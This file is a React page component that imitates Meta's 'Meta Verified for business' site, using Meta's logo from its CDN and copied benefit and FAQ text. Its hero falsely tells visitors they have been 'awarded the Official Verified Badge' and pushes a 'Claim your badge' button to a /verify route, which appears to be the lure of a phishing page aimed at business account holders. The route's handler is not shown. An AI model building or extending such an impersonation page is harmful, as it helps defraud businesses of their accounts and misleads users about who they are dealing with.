import { useState } from 'react';

export default function Home() {
  const [activeBenefit, setActiveBenefit] = useState(0);
  const [openFaq, setOpenFaq] = useState(null);

  const benefitsData = [
    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you.', image: '/images/benefit-1.webp' },
    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring.', image: '/images/benefit-2.webp' },
    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/images/benefit-3.webp' }
  ];
  const faqs = [
    { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements.' },
    { q: 'How do I update my information if I\'m not eligible?', a: 'Join our waitlist to stay updated.' }
  ];

  return (
    <div style={{ overflowX: 'hidden' }}>
      <header className="header">
          <div className="header-left">
              <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" /></a>
          </div>
      </header>

      <section id="hero">
          <div className="hero-inner">
              <div className="hero-text">
                  <div className="hero-text-inner">
                      <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                      <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge.</p>
                      <a href="/verify" className="btn-primary" style={{display: 'inline-block', textDecoration: 'none'}}>Claim your badge</a>
                  </div>
              </div>
              <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="benefits" id="benefits">
          <div className="benefits-header"><h2>Explore Meta Verified for business benefits.</h2></div>
          <div className="benefits-grid">
              <div className="benefits-image"><img src={benefitsData[activeBenefit].image} alt="Benefit" /></div>
              <div className="benefits-accordion">
                  {benefitsData.map((b, i) => (
                      <div key={i} className={`benefit-item ${i === activeBenefit ? 'active' : ''}`} onClick={() => setActiveBenefit(i)}>
                          <div className="benefit-header"><span>{b.title}</span></div>
                          <div className={`benefit-desc ${i === activeBenefit ? 'open' : ''}`}><p>{b.desc}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <section className="faq" id="faq">
          <div className="faq-inner">
              <h2>Frequently asked questions</h2>
              <div className="faq-list">
                  {faqs.map((f, i) => (
                      <div key={i} className="faq-item">
                          <button className="faq-question" onClick={() => setOpenFaq(openFaq === i ? null : i)}><span>{f.q}</span></button>
                          <div className={`faq-answer ${openFaq === i ? 'open' : ''}`}><p>{f.a}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>
    </div>
  );
}
